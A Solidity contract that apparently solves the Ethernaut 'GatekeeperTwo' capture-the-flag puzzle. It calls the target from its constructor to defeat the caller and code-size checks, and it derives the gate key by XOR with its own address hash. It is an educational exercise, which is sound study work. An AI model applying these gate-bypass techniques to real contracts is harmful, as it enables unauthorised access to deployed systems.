pragma solidity ^0.8.4;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GKTProxy{
    constructor(address _targetAddr) payable {
        IGatekeeperTwo target = IGatekeeperTwo(_targetAddr);

        /*
        * call target from the constructor so that we can meet the both requirements
        * tx.origin != msg.sender and extcodesize(caller()) == 0
        * 
        * calculating gateKey
        * uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
        * uint64(_gateKey) == (uint64(0) - 1) ^ uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))
        */

        uint64 val1 = 0xFFFFFFFFFFFFFFFF;
        uint64 val2 = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 gateKey = val1 ^ val2;
        
        bool retval = target.enter(bytes8(gateKey));

        require(retval, "cannot enter");
    }

}